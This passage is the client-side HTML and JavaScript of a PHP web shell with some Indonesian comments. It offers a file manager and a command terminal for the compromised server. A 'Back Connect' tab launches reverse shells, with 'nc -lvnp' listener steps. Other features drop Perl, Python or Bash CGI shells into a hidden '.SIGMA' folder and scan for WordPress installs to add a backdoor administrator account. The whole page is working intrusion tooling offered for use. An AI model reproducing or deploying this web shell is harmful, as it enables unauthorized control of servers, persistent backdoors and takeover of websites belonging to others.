            <button onclick="showModal('mkdir')" class="btn btn-success">New Folder</button>
            <button onclick="showModal('mkfile')" class="btn btn-warning">New File</button>
            <button onclick="goUp()" class="btn">Up</button>
            <button onclick="refreshDir()" class="btn">Refresh</button>
        </div>

        <table class="file-table" id="fileTable">
            <thead>
                <tr>
                    <th width="30%">Name</th>
                    <th width="8%">Size</th>
                    <th width="8%">Perms</th>
                    <th width="15%">Owner/Group</th>
                    <th width="19%">Modified</th>
                    <th width="20%">Actions</th>
                </tr>
            </thead>
            <tbody id="fileList">
                <tr><td colspan="6" style="text-align:center; padding:40px;"><span class="spinner"></span> Loading...</td></tr>
            </tbody>
        </table>
    </div>

    <!-- Tab: Back Connect -->
    <div id="tab-backconnect" class="tab-content hidden">
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>Reverse Shell</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <label>Type</label>
                    <select id="bc_type">
                        <option value="php">PHP</option>
                        <option value="perl">Perl</option>
                        <option value="python">Python</option>
                        <option value="bash">Bash</option>
                    </select>
                    
                    <label>IP Address</label>
                    <input type="text" id="bc_ip" value="<?php echo $sys_info['client_ip']; ?>">
                    
                    <label>Port</label>
                    <input type="text" id="bc_port" value="4444">
                    
                    <button onclick="backConnect()" class="btn btn-danger" style="width:100%">Connect</button>
                </div>
            </div>
            
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>Instructions</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <pre style="background:#1e1e2b; padding:15px; border-radius:8px; font-size:12px; color:#8a8fa0; border:1px solid #3a3a4a;">
1. Listen on your machine:
   nc -lvnp [port]

2. Click Connect button

3. Shell will connect back
                    </pre>
                </div>
            </div>
        </div>
    </div>

    <!-- Tab: CGI Shell (di folder .SIGMA) -->
    <div id="tab-cgi" class="tab-content hidden">
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>Perl CGI Shell</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <label>Base Path (akan dibuat folder .SIGMA)</label>
                    <input type="text" id="cgi_perl_path" value="<?php echo $cwd; ?>">
                    <button onclick="createCGI('perl')" class="btn btn-warning" style="width:100%">Create Perl CGI in .SIGMA</button>
                </div>
            </div>
            
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>Python CGI Shell</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <label>Base Path (akan dibuat folder .SIGMA)</label>
                    <input type="text" id="cgi_python_path" value="<?php echo $cwd; ?>">
                    <button onclick="createCGI('python')" class="btn btn-warning" style="width:100%">Create Python CGI in .SIGMA</button>
                </div>
            </div>
            
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>Bash CGI Shell</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <label>Base Path (akan dibuat folder .SIGMA)</label>
                    <input type="text" id="cgi_bash_path" value="<?php echo $cwd; ?>">
                    <button onclick="createCGI('bash')" class="btn btn-warning" style="width:100%">Create Bash CGI in .SIGMA</button>
                </div>
            </div>
        </div>
        
        <!-- Container untuk iframe CGI Shell -->
        <div id="cgiIframeContainer" style="margin-top:20px; display:none;">
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>CGI Shell Access (.SIGMA folder)</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <iframe id="cgiIframe" class="cgi-iframe" src="about:blank"></iframe>
                    <div style="margin-top:15px; text-align:center;">
                        <a href="#" id="cgiIframeLink" target="_blank" class="btn btn-primary">Open in New Tab</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Tab: WordPress (FIXED) -->
    <div id="tab-wordpress" class="tab-content hidden">
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header" onclick="toggleTool(this)">
                    <span>WordPress Admin Creator</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="tool-body">
                    <label>Scan Directory</label>
                    <input type="text" id="wp_scan_path" value="<?php echo $cwd; ?>">
                    <button onclick="scanWordPress()" class="btn btn-primary" style="width:100%; margin-bottom:15px">Scan for WordPress</button>
                    
                    <div id="wp_sites_container" style="display:none; margin-bottom:15px">
                        <label>Select WordPress Site (with wp-load.php)</label>
                        <select id="wp_sites" style="width:100%;"></select>
                        <div id="wp_count_badge" style="margin-top:5px; font-size:12px; color:#8a8fa0;"></div>
                    </div>
                    
                    <div id="wp_form" style="display:none">
                        <label>Username</label>
                        <input type="text" id="wp_user" value="admin">
                        
                        <label>Password</label>
                        <input type="text" id="wp_pass" value="Admin@123">
                        
                        <label>Email</label>
                        <input type="email" id="wp_email" value="admin@example.com">
                        
                        <button onclick="addWordPressAdmin()" class="btn btn-success" style="width:100%">Add Admin User</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Command Shell -->
    <div class="shell-section">
        <div class="shell-header">Terminal</div>
        <div class="shell-input">
            <input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.keyCode==13) executeCommand()">
            <button onclick="executeCommand()" class="btn btn-primary">Execute</button>
            <button onclick="clearOutput()" class="btn">Clear</button>
        </div>
        <div class="shell-output" id="shellOutput"></div>
    </div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <div class="modal-header"><h3>Upload File</h3><span class="close" onclick="closeModal('upload')">&times;</span></div>
        <form id="uploadForm" enctype="multipart/form-data">
            <div class="form-group"><label>Select File</label><input type="file" name="file" required></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('upload')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-primary">Upload</button>
            </div>
        </form>
    </div>
</div>

<div id="mkdirModal" class="modal">
    <div class="modal-content">
        <div class="modal-header"><h3>Create Directory</h3><span class="close" onclick="closeModal('mkdir')">&times;</span></div>
        <form id="mkdirForm">
            <div class="form-group"><label>Directory Name</label><input type="text" name="dir_name" required></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('mkdir')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-success">Create</button>
            </div>
        </form>
    </div>
</div>

<div id="mkfileModal" class="modal">
    <div class="modal-content" style="min-width:600px">
        <div class="modal-header"><h3>Create File</h3><span class="close" onclick="closeModal('mkfile')">&times;</span></div>
        <form id="mkfileForm">
            <div class="form-group"><label>File Name</label><input type="text" name="file_name" required></div>
            <div class="form-group"><label>Content</label><textarea name="content" rows="10"></textarea></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('mkfile')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-warning">Create</button>
            </div>
        </form>
    </div>
</div>

<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header"><h3>Rename</h3><span class="close" onclick="closeModal('rename')">&times;</span></div>
        <form id="renameForm">
            <input type="hidden" name="old_path" id="old_path">
            <div class="form-group"><label>New Name</label><input type="text" name="new_path" id="new_path" required></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('rename')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header"><h3>Change Permissions</h3><span class="close" onclick="closeModal('chmod')">&times;</span></div>
        <form id="chmodForm">
            <input type="hidden" name="path" id="chmod_path">
            <div class="form-group"><label>Permissions (e.g., 0755)</label><input type="text" name="perms" id="chmod_perms" required pattern="[0-7]{4}" placeholder="0755"></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('chmod')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-primary">Change</button>
            </div>
        </form>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content" style="min-width:800px">
        <div class="modal-header"><h3>Edit File: <span id="editFileName"></span></h3><span class="close" onclick="closeModal('edit')">&times;</span></div>
        <form id="editForm">
            <input type="hidden" name="file_path" id="edit_path">
            <div class="form-group"><textarea name="content" id="edit_content" style="min-height:400px"></textarea></div>
            <div class="modal-footer">
                <button type="button" onclick="closeModal('edit')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-success">Save</button>
            </div>
        </form>
    </div>
</div>

<div id="deleteModal" class="modal">
    <div class="modal-content">
        <div class="modal-header"><h3>Confirm Delete</h3><span class="close" onclick="closeModal('delete')">&times;</span></div>
        <p id="deleteMessage" style="margin:20px 0; color:#e0e0e0;"></p>
        <form id="deleteForm">
            <input type="hidden" name="path" id="delete_path">
            <div class="modal-footer">
                <button type="button" onclick="closeModal('delete')" class="btn">Cancel</button>
                <button type="submit" class="btn btn-danger">Delete</button>
            </div>
        </form>
    </div>
</div>

<script>
let currentDir = '<?php echo addslashes($cwd); ?>';
let wpSites = [];


// Utility Functions

function showAlert(msg, type = 'success') {
    const alert = document.createElement('div');
    alert.className = `alert ${type}`;
    alert.textContent = msg;
    document.body.appendChild(alert);
    setTimeout(() => alert.remove(), 3000);
}

function showModal(type) {
    document.getElementById(type + 'Modal').style.display = 'block';
}

function closeModal(type) {
    document.getElementById(type + 'Modal').style.display = 'none';
}

function showTab(tab) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
    document.getElementById('tab-' + tab).classList.remove('hidden');
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    event.target.classList.add('active');
    
    if (tab === 'files') loadFileList();
}

function toggleTool(header) {
    header.classList.toggle('collapsed');
    header.nextElementSibling.classList.toggle('collapsed');
}


// File Manager Functions

function loadFileList() {
    const tbody = document.getElementById('fileList');
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;"><span class="spinner"></span> Loading...</td></tr>';
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=list&dir=' + encodeURIComponent(currentDir)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success && data.data) {
            renderFileList(data.data);
        }
    });
}

function renderFileList(items) {
    let html = '';
    if (currentDir !== '/') {
        html += '<tr><td colspan="6"><a href="#" onclick="changeDir(\'' + currentDir.substring(0, currentDir.lastIndexOf('/')) + '\')" class="dir">.. (Parent Directory)</a></td></tr>';
    }
    
    items.forEach(item => {
        const size = item.type === 'dir' ? '-' : formatSize(item.size);
        const date = new Date(item.mtime * 1000).toLocaleString('en-US', { year:'numeric', month:'2-digit', day:'2-digit', hour:'2-digit', minute:'2-digit', second:'2-digit' });
        const path = encodeURIComponent(item.path);
        const name = encodeURIComponent(item.name);
        
        html += '<tr data-path="' + item.path + '" data-type="' + item.type + '">';
        html += '<td style="max-width:200px; overflow:hidden; text-overflow:ellipsis;">';
        if (item.type === 'dir') {
            html += '<a href="#" onclick="changeDir(\'' + item.path + '\')" class="dir">' + item.name + '/</a>';
        } else {
            html += '<span class="file" title="' + item.name + '">' + item.name + '</span>';
        }
        html += '</td>';
        html += '<td class="size">' + size + '</td>';
        html += '<td class="perms">' + item.perms + '</td>';
        html += '<td>' + item.owner + '/' + item.group + '</td>';
        html += '<td style="font-size:11px;">' + date + '</td>';
        html += '<td><div class="actions-cell">';
        
        if (item.type === 'file') {
            html += '<button onclick="editFile(\'' + path + '\')" class="action-btn edit" title="Edit">Edit</button>';
            html += '<button onclick="downloadFile(\'' + path + '\')" class="action-btn download" title="Download">Get</button>';
        }
        
        html += '<button onclick="renameItem(\'' + path + '\', \'' + name + '\')" class="action-btn rename" title="Rename">Rnm</button>';
        html += '<button onclick="chmodItem(\'' + path + '\', \'' + item.perms + '\')" class="action-btn perms" title="Chmod">Mod</button>';
        html += '<button onclick="deleteItem(\'' + path + '\')" class="action-btn delete" title="Delete">Del</button>';
        html += '</div></td></tr>';
    });
    
    document.getElementById('fileList').innerHTML = html;
}

function formatSize(bytes) {
    if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
    if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
    if (bytes >= 1024) return (bytes / 1024).toFixed(2) + ' KB';
    return bytes + ' B';
}

function changeDir(path) {
    currentDir = path;
    window.history.pushState({}, '', '?dir=' + encodeURIComponent(path));
    loadFileList();
    
    const parts = path.split('/').filter(p => p);
    let html = '<a href="#" onclick="changeDir(\'/\')">~</a>';
    let p = '';
    parts.forEach(part => {
        p += '/' + part;
        html += ' / <a href="#" onclick="changeDir(\'' + p + '\')">' + part + '</a>';
    });
    document.getElementById('currentPath').innerHTML = html;
}

function refreshDir() { loadFileList(); }
function goUp() { changeDir(currentDir.substring(0, currentDir.lastIndexOf('/')) || '/'); }

function renameItem(path, name) {
    path = decodeURIComponent(path);
    name = decodeURIComponent(name);
    document.getElementById('old_path').value = path;
    document.getElementById('new_path').value = path.substring(0, path.lastIndexOf('/') + 1) + name;
    showModal('rename');
}

function deleteItem(path) {
    document.getElementById('delete_path').value = decodeURIComponent(path);
    document.getElementById('deleteMessage').textContent = 'Delete: ' + decodeURIComponent(path) + '?';
    showModal('delete');
}

function chmodItem(path, perms) {
    document.getElementById('chmod_path').value = decodeURIComponent(path);
    document.getElementById('chmod_perms').value = perms;
    showModal('chmod');
}

function editFile(path) {
    path = decodeURIComponent(path);
    document.getElementById('edit_path').value = path;
    document.getElementById('editFileName').textContent = path.split('/').pop();
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=read&file=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            document.getElementById('edit_content').value = data.data;
            showModal('edit');
        } else {
            showAlert('Error loading file', 'error');
        }
    });
}

function downloadFile(path) {
    window.open('?action=download&file=' + path, '_blank');
}


// Command Execution

function executeCommand() {
    const cmd = document.getElementById('cmdInput').value;
    if (!cmd) return;
    
    const output = document.getElementById('shellOutput');
    output.innerHTML += '<div style="color: #4a9eff;">$ ' + cmd + '</div>';
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=cmd&cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(currentDir)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            output.innerHTML += '<div>' + (data.data || '').replace(/\n/g, '<br>') + '</div>';
        } else {
            output.innerHTML += '<div style="color: #e74c3c;">Error: ' + data.message + '</div>';
        }
        output.scrollTop = output.scrollHeight;
    })
    .catch(e => output.innerHTML += '<div style="color: #e74c3c;">Error: ' + e + '</div>');
    
    document.getElementById('cmdInput').value = '';
}

function clearOutput() {
    document.getElementById('shellOutput').innerHTML = '';
}


// Backconnect

function backConnect() {
    const type = document.getElementById('bc_type').value;
    const ip = document.getElementById('bc_ip').value;
    const port = document.getElementById('bc_port').value;
    
    if (!ip || !port) {
        showAlert('IP and Port required', 'error');
        return;
    }
    
    showAlert('Sending backconnect to ' + ip + ':' + port + ' using ' + type + '...', 'success');
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=backconnect&type=' + type + '&ip=' + ip + '&port=' + port
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert(data.message, 'success');
        } else {
            showAlert(data.message, 'error');
        }
    });
}


// CGI Shell (di folder .SIGMA)

function createCGI(type) {
    let path;
    if (type === 'perl') path = document.getElementById('cgi_perl_path').value;
    else if (type === 'python') path = document.getElementById('cgi_python_path').value;
    else if (type === 'bash') path = document.getElementById('cgi_bash_path').value;
    
    if (!path) {
        showAlert('Path required', 'error');
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=cgi&cgi_type=' + type + '&cgi_path=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert(data.message + ' in .SIGMA folder', 'success');
            
            const container = document.getElementById('cgiIframeContainer');
            const iframe = document.getElementById('cgiIframe');
            const link = document.getElementById('cgiIframeLink');
            
            iframe.src = data.full_url;
            link.href = data.full_url;
            
            container.style.display = 'block';
            container.scrollIntoView({ behavior: 'smooth' });
        } else {
            showAlert(data.message, 'error');
        }
    });
}


// WordPress (FIXED)

function scanWordPress() {
    const path = document.getElementById('wp_scan_path').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=wp_scan&path=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            if (data.sites && data.sites.length > 0) {
                wpSites = data.sites;
                const select = document.getElementById('wp_sites');
                select.innerHTML = '';
                data.sites.forEach(site => {
                    const option = document.createElement('option');
                    option.value = site;
                    option.textContent = site;
                    select.appendChild(option);
                });
                document.getElementById('wp_sites_container').style.display = 'block';
                document.getElementById('wp_form').style.display = 'block';
                document.getElementById('wp_count_badge').textContent = 'Found ' + data.sites.length + ' WordPress installation(s)';
                showAlert('Found ' + data.sites.length + ' WordPress sites', 'success');
            } else {
                document.getElementById('wp_sites_container').style.display = 'none';
                document.getElementById('wp_form').style.display = 'none';
                showAlert('No WordPress sites found (wp-load.php missing)', 'error');
            }
        }
    });
}

function addWordPressAdmin() {
    const select = document.getElementById('wp_sites');
    const path = select.value;
    const user = document.getElementById('wp_user').value;
    const pass = document.getElementById('wp_pass').value;
    const email = document.getElementById('wp_email').value;
    
    if (!path || !user || !pass || !email) {
        showAlert('All fields required', 'error');
        return;
    }
    
    showAlert('Creating admin user...', 'success');
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=wp_add&wp_path=' + encodeURIComponent(path) + '&username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass) + '&email=' + encodeURIComponent(email)
    })
    .then(r => r.json())
    .then(data => {
        showAlert(data.message, data.success ? 'success' : 'error');
        if (data.success) {
            // Clear form
            document.getElementById('wp_user').value = '';
            document.getElementById('wp_pass').value = '';
            document.getElementById('wp_email').value = '';
        }
    });
}


// Form Handlers

document.getElementById('uploadForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const fd = new FormData();
    fd.append('action', 'upload');
    fd.append('path', currentDir);
    fd.append('file', document.querySelector('#uploadForm input[type=file]').files[0]);
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
        body: fd
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Uploaded successfully');
            closeModal('upload');
            loadFileList();
        } else {
            showAlert('Upload failed', 'error');
        }
    });
});

document.getElementById('mkdirForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const dir = currentDir + '/' + document.querySelector('#mkdirForm input[name=dir_name]').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=mkdir&dir=' + encodeURIComponent(dir)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Directory created');
            closeModal('mkdir');
            loadFileList();
        } else {
            showAlert('Creation failed', 'error');
        }
    });
});

document.getElementById('mkfileForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const file = currentDir + '/' + document.querySelector('#mkfileForm input[name=file_name]').value;
    const content = document.querySelector('#mkfileForm textarea[name=content]').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=mkfile&file=' + encodeURIComponent(file) + '&content=' + encodeURIComponent(content)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('File created');
            closeModal('mkfile');
            loadFileList();
        } else {
            showAlert('Creation failed', 'error');
        }
    });
});

document.getElementById('renameForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const old = document.getElementById('old_path').value;
    const newPath = document.getElementById('new_path').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=rename&old=' + encodeURIComponent(old) + '&new=' + encodeURIComponent(newPath)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Renamed');
            closeModal('rename');
            loadFileList();
        } else {
            showAlert('Rename failed', 'error');
        }
    });
});

document.getElementById('deleteForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const path = document.getElementById('delete_path').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=delete&path=' + encodeURIComponent(path)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Deleted');
            closeModal('delete');
            loadFileList();
        } else {
            showAlert('Delete failed', 'error');
        }
    });
});

document.getElementById('chmodForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const path = document.getElementById('chmod_path').value;
    const perms = document.getElementById('chmod_perms').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=chmod&path=' + encodeURIComponent(path) + '&perms=' + perms
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Permissions changed');
            closeModal('chmod');
            loadFileList();
        } else {
            showAlert('Chmod failed', 'error');
        }
    });
});

document.getElementById('editForm')?.addEventListener('submit', e => {
    e.preventDefault();
    const file = document.getElementById('edit_path').value;
    const content = document.getElementById('edit_content').value;
    
    fetch('', {
        method: 'POST',
        headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=save&file=' + encodeURIComponent(file) + '&content=' + encodeURIComponent(content)
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            showAlert('Saved');
            closeModal('edit');
        } else {
            showAlert('Save failed', 'error');
        }
    });
});

window.onclick = e => {
    document.querySelectorAll('.modal').forEach(m => {
        if (e.target === m) m.style.display = 'none';
    });
};

// Load initial file list
loadFileList();
</script>
</body>
</html>